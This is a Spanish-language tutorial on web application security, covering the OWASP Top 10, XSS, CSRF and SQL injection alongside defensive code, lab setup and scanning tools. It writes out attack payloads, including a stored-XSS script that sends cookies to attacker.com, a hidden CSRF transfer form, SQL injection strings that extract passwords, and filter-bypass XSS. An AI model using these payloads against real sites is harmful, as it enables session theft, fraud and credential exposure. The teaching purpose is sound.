
# Seguridad en Aplicaciones Web

## 🎯 Objetivos de Aprendizaje

Al completar esta lección, serás capaz de:
- Identificar las principales vulnerabilidades web (OWASP Top 10)
- Implementar medidas de protección contra ataques comunes
- Realizar análisis de seguridad en aplicaciones web
- Aplicar principios de desarrollo seguro

## 📚 Contenido Teórico

### OWASP Top 10 - Vulnerabilidades Críticas

#### 1. Injection (A01:2021)
Los ataques de inyección, como SQL injection, XSS, y command injection, ocurren cuando datos no confiables se envían como parte de un comando o consulta.

**Ejemplo de SQL Injection:**
```sql
-- Consulta vulnerable
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Ataque
username: admin'--
password: cualquier_cosa

-- Consulta resultante
SELECT * FROM users WHERE username = 'admin'--' AND password = 'cualquier_cosa'
```

**Prevención:**
- Usar consultas parametrizadas (prepared statements)
- Validación de entrada estricta
- Principio de menor privilegio para bases de datos

#### 2. Broken Authentication (A02:2021)
Funciones de autenticación implementadas incorrectamente permiten a atacantes comprometer contraseñas, claves o tokens de sesión.

**Vulnerabilidades comunes:**
- Contraseñas débiles
- Ataques de fuerza bruta sin protección
- Gestión incorrecta de sesiones
- Credenciales hardcodeadas

**Prevención:**
- Autenticación multifactor (MFA)
- Políticas de contraseñas robustas
- Rate limiting
- Gestión segura de sesiones

#### 3. Sensitive Data Exposure (A03:2021)
Aplicaciones que no protegen adecuadamente datos sensibles como información financiera, sanitaria o personal.

**Mejores prácticas:**
- Cifrado en tránsito (HTTPS/TLS)
- Cifrado en reposo
- No almacenar datos innecesarios
- Usar algoritmos de cifrado actualizados

### Cross-Site Scripting (XSS)

#### Tipos de XSS

**1. Reflected XSS**
```html
<!-- URL maliciosa -->
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>

<!-- Respuesta del servidor -->
<p>Resultados para: <script>alert('XSS')</script></p>
```

**2. Stored XSS**
```html
<!-- Comentario malicioso almacenado -->
<div class="comment">
  <script>
    // Robar cookies
    new Image().src = "http://attacker.com/steal.php?cookie=" + document.cookie;
  </script>
</div>
```

**3. DOM-based XSS**
```javascript
// Código vulnerable
var userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;

// URL maliciosa
http://site.com/page.html#<img src=x onerror=alert('XSS')>
```

### Cross-Site Request Forgery (CSRF)

#### Cómo funciona CSRF
```html
<!-- Página maliciosa -->
<img src="http://bank.com/transfer?to=attacker&amount=1000" style="display:none">

<!-- O mediante formulario automático -->
<form action="http://bank.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**Prevención:**
- Tokens CSRF únicos por formulario
- Verificación del header Referer
- Cookies SameSite
- Validación de estado (estado de aplicación)

## 🛠️ Ejercicios Prácticos

### Ejercicio 1: Identificación de XSS
```html
<!-- Encuentra y corrige las vulnerabilidades XSS -->
<div id="search-results">
  Resultados para: <?php echo $_GET['query']; ?>
</div>

<script>
  var userComment = "<?php echo $_POST['comment']; ?>";
  document.getElementById('comment').innerHTML = userComment;
</script>
```

**Solución:**
```html
<div id="search-results">
  Resultados para: <?php echo htmlspecialchars($_GET['query'], ENT_QUOTES, 'UTF-8'); ?>
</div>

<script>
  var userComment = <?php echo json_encode($_POST['comment']); ?>;
  document.getElementById('comment').textContent = userComment;
</script>
```

### Ejercicio 2: Implementar Protección CSRF
```php
<?php
// Generar token CSRF
session_start();
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Verificar token en formularios POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        die('CSRF token mismatch');
    }
}
?>

<form method="POST">
  <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
  <input type="text" name="data" placeholder="Datos del formulario">
  <input type="submit" value="Enviar">
</form>
```

## 🔬 Laboratorio Práctico

### Configuración del Entorno de Práctica

1. **Instalar herramientas necesarias:**
```bash
# Instalar DVWA (Damn Vulnerable Web Application)
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Instalar Burp Suite Community
# Descargar desde: https://portswigger.net/burp/communitydownload
```

2. **Configurar proxy de interceptación:**
```bash
# Configurar navegador para usar proxy (127.0.0.1:8080)
# Importar certificado CA de Burp Suite
```

### Pruebas de Penetración Web

#### 1. Reconnaissance
```bash
# Enumerar tecnologías
whatweb http://target.com

# Buscar archivos sensibles
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Análisis de headers
curl -I http://target.com
```

#### 2. Testing de SQL Injection
```sql
-- Pruebas básicas
' OR '1'='1
' UNION SELECT NULL--
' OR SLEEP(5)--

-- Enumerar bases de datos
' UNION SELECT schema_name FROM information_schema.schemata--

-- Extraer datos
' UNION SELECT username,password FROM users--
```

#### 3. Testing de XSS
```javascript
// Payloads básicos
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

// Bypass de filtros
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
```

## 📊 Herramientas de Análisis

### Análisis Estático (SAST)
```bash
# SonarQube para análisis de código
docker run -d --name sonarqube -p 9000:9000 sonarqube:latest

# Bandit para Python
pip install bandit
bandit -r /path/to/python/project

# ESLint con reglas de seguridad
npm install eslint eslint-plugin-security
```

### Análisis Dinámico (DAST)
```bash
# OWASP ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://target.com

# Nikto web scanner
nikto -h http://target.com

# SQLMap para SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

## 🛡️ Implementación de Controles de Seguridad

### Content Security Policy (CSP)
```html
<!-- Configuración CSP básica -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:;">

<!-- CSP más restrictiva -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'none'; 
               script-src 'self'; 
               style-src 'self'; 
               img-src 'self'; 
               connect-src 'self';">
```

### Configuración de Headers de Seguridad
```apache
# Headers de seguridad en Apache
Header always set X-Frame-Options "SAMEORIGIN"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```

### Input Validation y Sanitización
```php
<?php
// Función de validación segura
function validateInput($input, $type) {
    switch($type) {
        case 'email':
            return filter_var($input, FILTER_VALIDATE_EMAIL);
        case 'int':
            return filter_var($input, FILTER_VALIDATE_INT);
        case 'url':
            return filter_var($input, FILTER_VALIDATE_URL);
        case 'string':
            return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
        default:
            return false;
    }
}

// Uso
$email = validateInput($_POST['email'], 'email');
$age = validateInput($_POST['age'], 'int');
?>
```

## 🎯 Evaluación y Certificación

### Preguntas de Evaluación

1. **¿Cuál es la diferencia entre XSS Reflected y Stored?**
2. **¿Cómo prevenir ataques CSRF en una aplicación web?**
3. **¿Qué headers HTTP mejoran la seguridad de una aplicación?**
4. **¿Cómo implementar validación segura de entrada de datos?**

### Proyecto Final
Desarrollar una mini-aplicación web que implemente:
- Autenticación segura con bcrypt
- Protección contra XSS y CSRF
- Validación de entrada robusta
- Headers de seguridad apropiados
- Logging de eventos de seguridad

## 📖 Recursos Adicionales

### Documentación Oficial
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Mozilla Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)

### Herramientas Recomendadas
- **Burp Suite** - Proxy de interceptación
- **OWASP ZAP** - Scanner de vulnerabilidades web
- **SQLMap** - Herramienta de SQL injection
- **XSSer** - Framework de XSS
- **Nikto** - Scanner de vulnerabilidades web

### Plataformas de Práctica
- **DVWA** - Damn Vulnerable Web Application
- **WebGoat** - Aplicación web intencionalmente vulnerable
- **VulnHub** - VMs vulnerables para práctica
- **HackTheBox** - Plataforma de pentesting
- **PortSwigger Web Security Academy** - Laboratorios interactivos

## 💡 Conclusiones

La seguridad en aplicaciones web es un campo en constante evolución. Los conceptos fundamentales incluyen:

1. **Principio de Defensa en Profundidad**: Múltiples capas de seguridad
2. **Validación de Entrada**: Nunca confiar en datos del usuario
3. **Principio de Menor Privilegio**: Otorgar solo los permisos necesarios
4. **Fail Secure**: Fallar de manera segura cuando algo va mal
5. **Seguridad por Diseño**: Incorporar seguridad desde el inicio del desarrollo

La práctica constante y mantenerse actualizado con las últimas amenazas y técnicas de protección es esencial para construir aplicaciones web seguras.
